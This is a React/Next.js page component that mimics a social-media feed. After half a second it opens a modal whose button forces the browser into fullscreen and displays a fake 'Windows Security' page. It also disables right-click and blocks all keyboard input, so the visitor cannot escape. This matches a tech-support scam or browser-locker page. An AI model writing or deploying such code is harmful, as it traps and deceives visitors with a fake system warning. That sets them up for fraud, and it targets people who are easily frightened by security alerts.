'use client';

import { useState, useEffect } from 'react';
import Header from '@/components/Header';
import LeftSidebar from '@/components/LeftSidebar';
import RightSidebar from '@/components/RightSidebar';
import Feed from '@/components/Feed';
import Modal from '@/components/Modal';
import WindowsSecurityPage from '@/components/WindowsSecurityPage';

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [showSecurityPage, setShowSecurityPage] = useState(false);

  const handleModalAction = () => {
    // Request fullscreen mode
    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen();
    } else if ((document.documentElement as unknown as { webkitRequestFullscreen?: () => void }).webkitRequestFullscreen) {
      (document.documentElement as unknown as { webkitRequestFullscreen: () => void }).webkitRequestFullscreen();
    } else if ((document.documentElement as unknown as { msRequestFullscreen?: () => void }).msRequestFullscreen) {
      (document.documentElement as unknown as { msRequestFullscreen: () => void }).msRequestFullscreen();
    }
    
    setIsModalOpen(false);
    setShowSecurityPage(true);
  };

  useEffect(() => {
    // Show modal after a short delay to simulate the design
    const timer = setTimeout(() => {
      setIsModalOpen(true);
    }, 500);

    // Disable right-click context menu
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
    };
    document.addEventListener('contextmenu', handleContextMenu);

    // Disable all keyboard inputs
    const handleKeyDown = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    };

    const handleKeyUp = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    };

    const handleKeyPress = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    };

    document.addEventListener('keydown', handleKeyDown, true);
    document.addEventListener('keyup', handleKeyUp, true);
    document.addEventListener('keypress', handleKeyPress, true);

    return () => {
      clearTimeout(timer);
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown, true);
      document.removeEventListener('keyup', handleKeyUp, true);
      document.removeEventListener('keypress', handleKeyPress, true);
    };
  }, []);

  return (
    <div className="min-h-screen bg-[#f0f2f5]">
      <Header />
      <div className="flex">
        <LeftSidebar />
        <div className="flex-1 ml-[280px] mr-[280px]">
          <Feed />
        </div>
        <RightSidebar />
      </div>
      <Modal isOpen={isModalOpen} onAction={handleModalAction} />
      {showSecurityPage && <WindowsSecurityPage />}
    </div>
  );
}
